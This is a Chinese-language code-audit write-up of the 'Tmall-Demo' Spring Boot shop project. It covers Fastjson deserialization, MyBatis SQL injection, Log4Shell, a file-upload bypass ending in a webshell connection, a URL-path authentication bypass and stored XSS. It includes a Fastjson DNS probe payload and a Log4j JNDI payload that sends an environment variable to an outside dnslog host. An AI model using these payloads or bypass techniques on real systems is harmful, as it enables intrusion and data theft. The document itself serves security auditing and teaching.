# Tmall-Demo

该项目是一款基于Spring Boot的综合电商平台，本次审计流程采用IDEA SAST插件配合人工审计验证的方式进行。

## 第三方组件

本项目基于Maven构建，对于这种项目应首先从pom.xml审计是否有存在漏洞的第三方组件，本项目引入的组件及版本如下：

|  组件名称  |   组件版本    |
| :--------: | :-----------: |
| SpringBoot | 2.1.6.RELEASE |
|  Fastjson  |    1.2.58     |
|   Mysql    |    5.1.47     |
|   Druid    |    1.1.19     |
|  Taglibs   |     1.2.5     |
|  Mybatis   |     3.5.1     |
|   Log4j2   |    2.10.0     |

## 代码审计漏洞验证

### Fastjson反序列化

该项目的Fastjson版本为1.2.58，该版本存在反序列化漏洞，通过搜索漏洞触发点JSON.parse()或JSON.parseObject()，看参数是否可控，有无经过过滤来验证是否存在反序列化漏洞

1. 通过插件发现有5处地方可能存在漏洞触发点

![image-20251231150116128](Tmall-Demo/image-20251231150116128.png)

2. 找到漏洞触发点后，首先要看参数是否可控，然后前面代码有无对参数进行过滤，最后读取漏洞点的触发路由

   ![image-20251231150835646](Tmall-Demo/image-20251231150835646.png)

3. 可看到参数propertyJson是可控的，路由为admin/product，但是POST方法进行提交

   ![image-20251231150845565](Tmall-Demo/image-20251231150845565.png)

4. 无法直接找到可触发的路由，但可根据代码功能添加产品信息找到相应的触发点，进入管理员后台后找到添加产品的功能

   ![image-20251231151108513](Tmall-Demo/image-20251231151108513.png)

5. propertyJson是产品属性，故可猜测属性值这里就是触发点，使用burp抓包确认

   ![image-20251231151336877](Tmall-Demo/image-20251231151336877.png)

6. 确认该处为漏洞点

   ![image-20251231151512482](Tmall-Demo/image-20251231151512482.png)

7. 使用探测payload验证漏洞存在

   ![image-20251231151546377](Tmall-Demo/image-20251231151546377.png)

![image-20251231151557716](Tmall-Demo/image-20251231151557716.png)

```java
{"@type":"java.net.Inet4Address","val":"wkjsuoegtp.iyhc.eu.org"}
@type指定要加载的类Inet4Address，解析器或尝试获得该类的setter/构造器，但Inet4Address类无setter/构造器，故转而获取父类InetAddress中的静态工厂方法getByName(String)
```

同样的方法发现其它四处可能的漏洞点同样存在漏洞

### SQL注入

该项目使用Mybatis处理SQL语句

![image-20260104103516309](Tmall-Demo/image-20260104103516309.png)

对于Mybatis可搜索未预编译的语句`${`来找到漏洞点

![image-20260104103916329](Tmall-Demo/image-20260104103916329.png)

发现可控参数都是orderUtil.orderBy

![image-20260104111934153](Tmall-Demo/image-20260104111934153.png)

随便选一个xml文件跟进看一下

![image-20260104112042726](Tmall-Demo/image-20260104112042726.png)

跟踪到`ProductMapper`找到`orderUtil`参数的方法签名`select`

![image-20260104113233280](Tmall-Demo/image-20260104113233280.png)

继续跟踪在`ProductServiceImpl`中找到传入参数`orderUtil`的具体方法实现`getList`

![image-20260104134852544](Tmall-Demo/image-20260104134852544.png)

跟踪到`ProductController`找到用户可控参数`orderUtil`的具体路由

![image-20260104135045483](Tmall-Demo/image-20260104135045483.png)

通过GET方法传入`orderBy`参数控制

![image-20260104135406496](Tmall-Demo/image-20260104135406496.png)

根据路由`admin/product/{index}/{count}`找到对应的漏洞点

![image-20260104140755117](Tmall-Demo/image-20260104140755117.png)

使用sqlmap验证存在SQL注入

![image-20260104140822598](Tmall-Demo/image-20260104140822598.png)

除此之外路由`product/{index}/{count}`、`admin/order/{index}/{count}`、`admin/reward/{index}/{count}`、`admin/user/{index}/{count}`同样可用相同的方法找到存在SQL注入漏洞

### log4j反序列化

log4j的版本为2.10.0，位于2.0<log4j<2.14.1之间，存在CVE-2021-44228漏洞

![image-20260104160747927](Tmall-Demo/image-20260104160747927.png)

搜索关键字logger

![image-20260108091935606](Tmall-Demo/image-20260108091935606.png)

漏洞触发点一共分为五个级别：**DEBUG、INFO、WARN、ERROR和FATAL**

该源码主要使用logger.info级别记录日志

找到用户参数可控的触发点`originalFileName`通过`getOriginalFilename()`获取，该功能点的功能为用户更换头像

![image-20260108092323318](Tmall-Demo/image-20260108092323318.png)

根据路由找到漏洞触发点，抓包使用`payload=${jndi:ldap://${env:OS}.s48lo3.dnslog.cn}`验证漏洞存在

![image-20260108092906243](Tmall-Demo/image-20260108092906243.png)

![image-20260108092928255](Tmall-Demo/image-20260108092928255.png)

除此之外还用两处同样的漏洞触发点

![image-20260108093015457](Tmall-Demo/image-20260108093015457.png)

### 文件上传漏洞

找到四处上传图片的功能点，可能存在文件上传漏洞

![image-20260104100605229](Tmall-Demo/image-20260104100605229.png)

filePath是随机生成的，上传成功会返回文件名

![image-20260104100748181](Tmall-Demo/image-20260104100748181.png)

图片上传的校验逻辑是MIME验证，可通过前端抓包绕过

![image-20260104101334093](Tmall-Demo/image-20260104101334093.png)

上传成功，返回文件名

![image-20260104105353272](Tmall-Demo/image-20260104105353272.png)

找到上传路径，使用哥斯拉连接

![image-20260104105947827](Tmall-Demo/image-20260104105947827.png)

![image-20260104105836123](Tmall-Demo/image-20260104105836123.png)

### 权限绕过漏洞

该项目使用过滤器进行权限绕过

![image-20260104102652150](Tmall-Demo/image-20260104102652150.png)

当URL路径中包含/admin/login或/admin/account即可绕过权限检验，先使用burp抓包一个管理员功能点，该功能点使用Cookie鉴权

![image-20260104103016799](Tmall-Demo/image-20260104103016799.png)

删除Cookie后显示权限不足

![image-20260104103059673](Tmall-Demo/image-20260104103059673.png)

在路径中添加/admin/login或/admin/account即可绕过鉴权

![image-20260104103153621](Tmall-Demo/image-20260104103153621.png)

### 存储型XSS漏洞

按原理审计，存储型XSS肯定要将XSS语句存储到数据库中，然后刷新页面使参数被浏览器执行，那么存入数据库的方法大部分是`update`，因为写入数据的方法也就是`insert`和`update`，`insert`的数据不一定会在前端显示而update的数据肯定会在前端刷新

除此之外还需要代码层未对参数过滤以及没有针对XSS部署全局`Filter`或`Interceptor`

该项目仅有`Filter`拦截器且作用为管理员鉴权

![image-20260104150449567](Tmall-Demo/image-20260104150449567.png)

搜索使用了`update`的sql语句

![image-20260104150628999](Tmall-Demo/image-20260104150628999.png)

进入`AdminMapper.xml`

![image-20260104152014017](Tmall-Demo/image-20260104152014017.png)

跟踪到sql语句调用接口`AdminMapper.java`找到方法签名`updateOne`

![image-20260104152947625](Tmall-Demo/image-20260104152947625.png)

在`AdminServiceImpl.java`找到具体方法实现`update`

![image-20260104153121524](Tmall-Demo/image-20260104153121524.png)

跟踪找到路由文件`AccountController.java`，功能为更新管理员信息

![image-20260104153238320](Tmall-Demo/image-20260104153238320.png)

![image-20260104153306934](Tmall-Demo/image-20260104153306934.png)

根据路由找到管理员更新信息的功能点

![image-20260104153436388](Tmall-Demo/image-20260104153436388.png)

成功触发xss

![image-20260104153505117](Tmall-Demo/image-20260104153505117.png)

除此之外所有使用了`update`语句的功能点都存在漏洞